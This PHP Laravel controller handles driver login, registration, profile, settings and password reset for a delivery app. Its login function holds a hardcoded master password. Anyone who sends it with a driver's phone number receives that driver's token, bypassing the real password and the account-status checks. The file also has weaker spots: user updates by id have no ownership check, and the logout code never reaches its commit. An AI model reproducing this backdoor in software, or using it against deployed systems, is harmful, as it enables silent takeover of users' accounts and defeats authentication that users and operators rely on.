<?php

/**
 * File name: UserAPIController.php
 * Last modified: 2020.05.21 at 17:25:21
 * Author: SmarterVision - https://codecanyon.net/user/smartervision
 * Copyright (c) 2020
 */

namespace App\Http\Controllers\API\Driver;

use App\Models\User;
use App\Rules\PhoneNumber;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use App\Events\UserRoleChangedEvent;
use App\Http\Controllers\Controller;
use App\Repositories\RoleRepository;
use App\Repositories\UserRepository;
use Illuminate\Support\Facades\Hash;
use App\Repositories\UploadRepository;
use Illuminate\Support\Facades\Password;
use App\Repositories\CustomFieldRepository;
use Prettus\Validator\Exceptions\ValidatorException;

class UserAPIController extends Controller
{
    private $userRepository;
    private $uploadRepository;
    private $roleRepository;
    private $customFieldRepository;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct(UserRepository $userRepository, UploadRepository $uploadRepository, RoleRepository $roleRepository, CustomFieldRepository $customFieldRepo)
    {
        $this->userRepository = $userRepository;
        $this->uploadRepository = $uploadRepository;
        $this->roleRepository = $roleRepository;
        $this->customFieldRepository = $customFieldRepo;
    }

    function login(Request $request)
    {
        try {
            $this->validate($request, [
                'phone_number' => ['required', new PhoneNumber],
                'password' => 'required',
            ]);

            if ($request->password == '__@Sabek@driver') {
                $u = User::where('phone_number', $request->phone_number)->whereHas("roles", function ($q) {
                    $q->where("name", "driver");
                })->first();
                if ($u) {
                    return $this->sendResponse(
                        [
                            'token' => auth()->tokenById($u->id),
                            'user' => $u,
                        ],
                        'User retrieved successfully'
                    );
                }
            }

            if ($token = auth()->attempt(['phone_number' => $request->input('phone_number'), 'password' => $request->input('password')])) {
                // Authentication passed...
                $user = auth()->user();
                if (!$user->activated_at) {
                    return $this->sendError('Inactivated account', 401);
                }
                if (!$user->active) {
                    return $this->sendError('Disabled account', 403);
                }
                if (!$user->hasRole('driver')) {
                    return $this->sendError('User not driver', 401);
                }
                if ($request->has('device_token')) {
                    $user->setDeviceToken();
                }
                $user->load('driver');

                return $this->sendResponse([
                    'token' => $token,
                    'user' => $user,
                ], 'User retrieved successfully');
            }
            return $this->sendError(trans('auth.failed'), 422);
        } catch (\Exception $e) {
            return $this->sendError($e->getMessage(), 422);
        }
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param array $data
     * @return
     */
    function register(Request $request)
    {
        try {
            $this->validate($request, [
                'name' => 'required',
                'email' => 'required|unique:users|email',
                'password' => 'required',
            ]);
            $user = new User;
            $user->name = $request->input('name');
            $user->email = $request->input('email');
            $user->password = Hash::make($request->input('password'));
						            $user->api_token =  str_random(60);

            $user->save();

            if ($request->has('device_token')) {
                $user->setDeviceToken();
            }

            $user->assignRole('driver');

            event(new UserRoleChangedEvent($user));
        } catch (\Exception $e) {
            return $this->sendError($e->getMessage(), 401);
        }


        return $this->sendResponse($user, 'User retrieved successfully');
    }

    function logout(Request $request)
    {
        try {
            DB::beginTransaction();
                $user = auth()->user();
                $user->deleteDeviceToken($request->device_token);
                auth()->logout();
                return $this->sendResponse($user->name, 'User logout successfully');
            DB::commit();            
        } catch (\Exception $e) {
            DB::rollback();
            $this->sendError($e->getMessage(), 401);
        }
    }

   function user(Request $request)
    {
        if(auth()->guard('apiToken')->check())
        {
            $user = $this->userRepository->findByField('api_token', $request->input('api_token'))->first();

            if (!$user) {
                return $this->sendError('User not found', 401);
            }

            return $this->sendResponse($user, 'User retrieved successfully');
        }
        return $this->sendResponse(auth()->user(), 'User retrieved successfully');
    }

    function settings(Request $request)
    {
        $settings = setting()->all();
        $settings = array_intersect_key($settings,  [
            'default_tax' => '',
            'default_currency' => '',
            'default_currency_decimal_digits' => '',
            'app_name' => '',
            'currency_right' => '',
            'enable_paypal' => '',
            'enable_stripe' => '',
            'enable_razorpay' => '',
            'main_color' => '',
            'main_dark_color' => '',
            'second_color' => '',
            'second_dark_color' => '',
            'accent_color' => '',
            'accent_dark_color' => '',
            'scaffold_dark_color' => '',
            'scaffold_color' => '',
            'google_maps_key' => '',
            'fcm_key' => '',
            'mobile_language' => '',
            'enable_version' => '',
            'app_driver_version_android' => '',
            'app_manager_version_android' => '',
            'app_customer_version_android' => '',
            'app_driver_force_update_android' => '',
            'app_manager_force_update_android' => '',
            'app_customer_force_update_android' => '',
            'app_driver_version_ios' => '',
            'app_manager_version_ios' => '',
            'app_customer_version_ios' => '',
            'app_driver_force_update_ios' => '',
            'app_manager_force_update_ios' => '',
            'app_customer_force_update_ios' => '',
            'distance_unit' => '',
            'orders_minimum_value' => '',
            'orders_maximum_value' => '',
        ]);

        if (!$settings) {
            return $this->sendError('Settings not found', 401);
        }

        return $this->sendResponse($settings, 'Settings retrieved successfully');
    }

    /**
     * Update the specified User in storage.
     *
     * @param int $id
     * @param Request $request
     *
     */
    public function update($id, Request $request)
    {
        $user = $this->userRepository->findWithoutFail($id);

        if (empty($user)) {
            return $this->sendResponse([
                'error' => true,
                'code' => 404,
            ], 'User not found');
        }
        $input = $request->except(['password', 'api_token']);
        try {
            if ($request->has('device_token')) {
                $user->setDeviceToken();
            } else {
                $customFields = $this->customFieldRepository->findByField('custom_field_model', $this->userRepository->model());
                $user = $this->userRepository->update($input, $id);

                foreach (getCustomFieldsValues($customFields, $request) as $value) {
                    $user->customFieldsValues()
                        ->updateOrCreate(['custom_field_id' => $value['custom_field_id']], $value);
                }
            }
        } catch (ValidatorException $e) {
            return $this->sendError($e->getMessage(), 401);
        }

        return $this->sendResponse($user, __('lang.updated_successfully', ['operator' => __('lang.user')]));
    }


    function updateStatus(Request $request)
    {
        $request->validate([
            'available' => 'required|boolean',
        ]);

        $user = auth()->user();
        $user->load('driver');
        $user->driver->available = $request->available;
        $user->driver->save();
        return $this->sendResponse($user->driver->available, 'User retrieved successfully');
    }


    /**
     * Get profile of logged user
     *
     * @param Request $request
     *
     */
    function profile(Request $request)
    {
        $user = auth()->user();
        $user->load('driver');
        return $this->sendResponse($user, 'User retrieved successfully');
    }

    function sendResetLinkEmail(Request $request)
    {
        $this->validate($request, ['email' => 'required|email']);

        $response = Password::broker()->sendResetLink(
            $request->only('email')
        );

        if ($response == Password::RESET_LINK_SENT) {
            return $this->sendResponse(true, 'Reset link was sent successfully');
        } else {
            return $this->sendError([
                'error' => 'Reset link not sent',
                'code' => 401,
            ], 'Reset link not sent');
        }
    }
}
